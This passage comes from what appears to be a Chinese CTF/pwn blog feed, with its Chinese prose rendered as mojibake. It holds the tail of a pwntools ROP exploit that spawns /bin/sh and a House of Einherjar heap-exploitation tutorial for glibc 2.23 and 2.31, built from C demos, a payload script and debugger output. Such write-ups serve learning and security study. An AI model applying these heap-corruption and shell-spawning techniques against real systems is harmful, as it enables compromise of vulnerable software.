class="number">3</span>,<span class="comment">#7  0</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,pop_rdi,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">4</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">5</span>, <span class="comment">#7 pop rdi</span></span><br><span class="line">        <span class="number">0</span>,sh_str&amp;<span class="number">0xffffffff</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">6</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">0</span>,(sh_str&gt;&gt;<span class="number">32</span>)&amp;<span class="number">0xffffffff</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">7</span>,<span class="comment">#7</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,xorrdx,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">8</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">9</span>, <span class="comment">#7 xorrdx</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,pop_rax,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">10</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">11</span>,<span class="comment">#7 pop rax</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,<span class="number">0x3b</span>,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">12</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">13</span>,<span class="comment">#7  0x3b</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0</span>,syscall,<span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">14</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">9</span>,<span class="number">15</span>, <span class="comment">#7 syscall</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0x6e69622f</span>, <span class="comment">#10</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">16</span>,<span class="comment">#7</span></span><br><span class="line">        <span class="number">0</span>,<span class="number">0x68732f</span>, <span class="comment">#10 </span></span><br><span class="line">        <span class="number">0</span>,<span class="number">17</span>,<span class="comment">#7</span></span><br><span class="line">        </span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="drop"><a href="#drop" class="headerlink" title="drop"></a>drop</h2><p>å»ç¬¦å·è¡¨çš„rustç¨‹åºï¼ŒåŸºæœ¬çœ‹ä¸æ‡‚åæ±‡ç¼–ï¼Œåªèƒ½é…åˆgdbè°ƒè¯•ç°è±¡æ¥çœ‹</p><p>ç¬¬ä¸€æ¬¡å…ˆæ·»åŠ äº†ffffï¼Œåˆæ·»åŠ äº†ddddï¼Œå‘ç°æ˜¯ç”³è¯·äº†ä¸€ä¸ª0x71å¤§å°çš„å †å—æ¥åšç®¡ç†ç»“æ„ï¼Œå †å—çš„å¤§å°å’Œè¾“å…¥çš„å†…å®¹ç›¸å…³</p><p><img src="/2023/08/02/startctf/image-20230806192723745.png" alt="image-20230806192723745"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>House Of Einherjar</title>
      <link href="/2023/07/29/House-Of-Einherjar/"/>
      <url>/2023/07/29/House-Of-Einherjar/</url>
      
        <content type="html"><![CDATA[<h1 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h1><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>ä¸€èˆ¬å°±æ˜¯æœ‰off by oneå¯ä»¥è¦†ç›–previnuseä½ï¼Œé‡Šæ”¾æ—¶ä¼šè§¦å‘ä¸‹é¢çš„åˆå¹¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">    prevsize = prev_size(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="wikiä¸Šçš„ä¾‹å­"><a href="#wikiä¸Šçš„ä¾‹å­" class="headerlink" title="wikiä¸Šçš„ä¾‹å­"></a>wikiä¸Šçš„ä¾‹å­</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span>* s0 = <span class="built_in">malloc</span>(<span class="number">0x200</span>);ã€€<span class="comment">//æ„é€ fake chunk</span></span><br><span class="line">    <span class="type">char</span>* s1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">char</span>* s2 = <span class="built_in">malloc</span>(<span class="number">0xf0</span>);ã€€</span><br><span class="line">    <span class="type">char</span>* s3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>); <span class="comment">//ä¸ºäº†ä¸è®©s2ä¸top chunk åˆå¹¶</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;begin\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, s0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s0\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s0, <span class="number">0x200</span>); <span class="comment">//è¯»å…¥fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input s1\n&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s1, <span class="number">0x19</span>); <span class="comment">//Off By One</span></span><br><span class="line">    <span class="built_in">free</span>(s2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./example&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;begin\n&quot;</span>)</span><br><span class="line">address = <span class="type">int</span>(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s0\n&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>) + p64(address) * <span class="number">2</span> + <span class="string">&quot;A&quot;</span>*<span class="number">0xe0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p64(address) * <span class="number">2</span>æ˜¯ä¸ºäº†ç»•è¿‡</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x100</span>) <span class="meta">#fake size</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;input s1\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span> + p64(<span class="number">0x220</span>) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvall()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>åœ¨s1é€šè¿‡å †å—çš„ç©ºé—´å¤ç”¨ï¼Œåœ¨s2çš„prevsizeå†™ä¸Š0x220,å¹¶ç”¨off by oneæŠŠprevinuseä½ç½®é›¶ï¼Œ</p><p>s2å †æƒ…å†µ</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730141511488.png" alt="image-20230730141511488"></p><p>s1-prevsizeæ‰¾åˆ°å‡å †å—è¿›è¡Œunlinkæ“ä½œï¼Œå‡å †å—s0è¿˜éœ€è¦ç»•è¿‡unlinké‡Œä¸‹é¢çš„æ£€æŸ¥</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>)) \</span><br><span class="line">malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„å›¾if (__builtin_expect (FD-&gt;bk !&#x3D; P || BK-&gt;fd !&#x3D; P, 0)) \ç»•è¿‡</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142117126.png" alt="image-20230730142117126"></p><p>ä¸‹é¢çš„å›¾if (__builtin_expect (chunksize(P) !&#x3D; prev_size (next_chunk(P)), 0))\ç»•è¿‡</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142455457.png" alt="image-20230730142455457"></p><p>free(s2)åå°±å¯ä»¥æŠŠs0 0x7ac010æ”¾å…¥unsortedbinäº†</p><p><img src="/2023/07/29/House-Of-Einherjar/image-20230730142640857.png" alt="image-20230730142640857"></p><h3 id="how2heapä¾‹å­"><a href="#how2heapä¾‹å­" class="headerlink" title="how2heapä¾‹å­"></a>how2heapä¾‹å­</h3><p>æ¥è‡ªhollkå¸ˆå‚…åšå®¢çš„ç®€åŒ–ç‰ˆï¼Œä¸Šä¸€ä¸ªä¾‹å­å¦‚æœæŠŠä¼ªé€ å †ä¼ªé€ åˆ°æ ˆä¸Šä¼šå› ä¸ºå †å—å¤ªå¤§ï¼Œå¯¼è‡´ç”³è¯·ä¸å‡ºæ¥ï¼ŒåŠæ³•å°±æ˜¯å’Œtopchunkåˆå¹¶åç”³è¯·</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="comment">//gcc -g hollk.c -o hollk //glibc-2.23  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint8_t</span>* a;</span><br><span class="line">  <span class="type">uint8_t</span>* b;</span><br><span class="line">  <span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line">  a = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;a&#x27;, we need the &#x27;real&#x27; size of &#x27;a&#x27; after rounding:%#x\n&quot;</span>, real_a_size);</span><br><span class="line">    </span><br><span class="line">  <span class="comment">//åœ¨æ ˆä¸Šä¼ªé€ fake chunk</span></span><br><span class="line">  <span class="type">size_t</span> fake_chunk[<span class="number">6</span>]; </span><br><span class="line">  fake_chunk[<span class="number">0</span>] = <span class="number">0</span>; </span><br><span class="line">  fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>;</span><br><span class="line">  fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, fake_chunk);</span><br><span class="line"></span><br><span class="line">  b = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line">  <span class="comment">//æ¨¡æ‹Ÿoff by oneå°†b previnuseä½ç½®é›¶</span></span><br><span class="line">  a[real_a_size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, b - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//æ¨¡æ‹Ÿåˆ©ç”¨åœ°å€å¤ç”¨å†™bçš„prevsize</span></span><br><span class="line">  *(<span class="type">size_t</span>*)&amp;a[real_a_size - <span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"><span class="comment">//ç»•è¿‡unlink /if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  æ£€æŸ¥</span></span><br><span class="line">  fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"><span class="comment">//unlinkåˆå¹¶åä¼šå’Œtopchunkåˆå¹¶</span></span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="comment">//å¯ä»¥æŠŠfake_chunkç”³è¯·å‡ºæ¥</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/s/h/glibc_2<span class="number">.31</span>&gt; ./a.out</span><br><span class="line">a: <span class="number">0xccf010</span></span><br><span class="line">Since we want to overflow <span class="string">&#x27;a&#x27;</span>, we need the <span class="string">&#x27;real&#x27;</span> size of <span class="string">&#x27;a&#x27;</span> after rounding:<span class="number">0x38</span></span><br><span class="line">Our fake chunk at <span class="number">0x7fff767b3280</span> looks like:</span><br><span class="line">b: <span class="number">0xccf050</span></span><br><span class="line"></span><br><span class="line">b.size: <span class="number">0x101</span></span><br><span class="line">b.size: <span class="number">0x100</span></span><br><span class="line">Our fake prev_size will be <span class="number">0xccf040</span> - <span class="number">0x7fff767b3280</span> = <span class="number">0xffff80008a51bdc0</span></span><br><span class="line">Our fake chunk size is now <span class="number">0xffff80008a53cd81</span> (b.size + fake_prev_size)</span><br><span class="line">Next <span class="built_in">malloc</span>(<span class="number">0x200</span>) is at <span class="number">0x7fff767b3290</span></span><br></pre></td></tr></table></figure><p>ç»•è¿‡unlinkå¤§å°çš„æ£€æµ‹åªéœ€è¦*(fake_chunk+size)&#x3D;sizeå°±è¡Œäº†ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¸‹é¢çš„æ–¹æ³•ï¼Œç”¨ä¸‹é¢çš„æ–¹æ³•å› ä¸ºæ—¶0x100å¤§å°æ˜¯unsortedbinå°±ä¸ç”¨æŠŠlargebinæ‰ä¼šç”¨åˆ°çš„fd_nextsizeå’Œbk_nextsizeè¦†å†™äº†</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> fake_chunk[<span class="number">6</span>]; </span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; </span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>;</span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk;</span><br><span class="line"><span class="comment">/* fake_chunk[4] = (size_t)fake_chunk; */</span></span><br><span class="line"><span class="comment">/* fake_chunk[5] = (size_t)fake_chunk; */</span></span><br><span class="line">fake_chunk[<span class="number">0x100</span>/<span class="number">8</span>]=<span class="number">0x100</span>;<span class="comment">//ç»•è¿‡if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))  </span></span><br><span class="line">æŠŠåé¢çš„fake_chunk[<span class="number">1</span>] = fake_size;æ³¨é‡Šæ‰</span><br></pre></td></tr></table></figure><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><h3 id="how2heapä¾‹å­-1"><a href="#how2heapä¾‹å­-1" class="headerlink" title="how2heapä¾‹å­"></a>how2heapä¾‹å­</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prepare the target</span></span><br><span class="line">  <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="type">char</span>*)&amp;stack_var);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// create a fake chunk</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">  a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">  a[<span class="number">2</span>] = (<span class="type">size_t</span>)a; <span class="comment">// fwd</span></span><br><span class="line">  a[<span class="number">3</span>] = (<span class="type">size_t</span>)a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">  <span class="type">uint8_t</span>* b = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">   * a value of 0x00. The least significant byte of this will be 0x00, because the size of</span></span><br><span class="line"><span class="comment">   * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">  <span class="type">uint8_t</span>* c = (<span class="type">uint8_t</span>*)<span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span>* c_size_ptr = (<span class="type">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">  <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¦†å†™cçš„previnuseä½ä¸º0</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">  b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">    <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line">  <span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>) - (<span class="type">uint8_t</span>*)a);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="type">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="comment">//è¦†å†™cçš„prevsize</span></span><br><span class="line">  *(<span class="type">size_t</span>*)&amp;b[real_b_size - <span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size æ¥ç»•è¿‡unlinkçš„å¤§å°æ£€æŸ¥</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">  a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* x[<span class="number">7</span>];</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(x) / <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">    x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(x) / <span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(x[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="comment">//free cåå°±ä¼šæŠŠbåŒ…è£¹èµ·æ¥æ”¾å…¥unsortedbiné‡Œ</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">  <span class="comment">//dä¼šæŠŠbå†æ¬¡ç”³è¯·å‡ºæ¥</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// tcache poisoning</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">  <span class="comment">//è¿™é‡Œä¸»è¦æ˜¯é˜²æ­¢åé¢ç”³è¯·å †å—æ—¶ tcache_index&lt;0å¯¼è‡´å¤±è´¥</span></span><br><span class="line">  <span class="type">uint8_t</span>* pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">  <span class="comment">//ä¿®æ”¹tcacheé‡Œbçš„ä¸‹ä¸€ä¸ªä½ç©ºé—²å †ä½ç›®æ 